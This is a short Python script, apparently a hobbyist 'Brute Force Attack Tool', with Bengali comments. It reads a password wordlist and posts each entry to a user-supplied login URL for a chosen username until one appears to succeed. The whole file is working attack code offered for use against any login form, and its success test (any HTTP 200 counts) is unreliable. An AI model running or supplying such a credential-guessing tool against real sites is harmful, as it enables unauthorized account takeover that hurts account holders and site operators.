import requests
import os

def banner():
    print("\n🔓 Brute Force Attack Tool by MD ABDULLAH\n")

def run_attack():
    url = input("🌐 Target Login URL: ").strip()
    username = input("👤 Username: ").strip()
    wordlist = input("📂 Wordlist path (default: wordlist.txt): ").strip()

    if not wordlist:
        wordlist = "wordlist.txt"

    # ওয়ার্ডলিস্ট ফাইল অস্তিত্ব ও পারমিশন চেক
    if not os.path.isfile(wordlist):
        print(f"❌ Wordlist file '{wordlist}' does not exist!")
        return
    if not os.access(wordlist, os.R_OK):
        print(f"❌ Wordlist file '{wordlist}' is not readable!")
        return

    try:
        with open(wordlist, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = file.readlines()
    except Exception as e:
        print(f"❌ Cannot open wordlist file! Error: {e}")
        return

    print(f"\n🎯 Starting brute force on {url} ...\n")

    for pwd in passwords:
        password = pwd.strip()
        data = {'username': username, 'password': password}
        try:
            res = requests.post(url, data=data, timeout=10)
            # এখানে Success condition আপনার টার্গেট অনুযায়ী কাস্টমাইজ করতে পারেন
            if "Welcome" in res.text or res.status_code == 200:
                print(f"✅ Password Found: {password}")
                return
            else:
                print(f"❌ Tried: {password}")
        except requests.exceptions.RequestException as e:
            print(f"⚠️ Network error occurred: {e}")
            # চাইলে এখানে continue করতে পারেন বা ব্রেক

    print("🔒 Brute force complete. Password not found.")

def main():
    banner()
    run_attack()

if __name__ == "__main__":
    main()
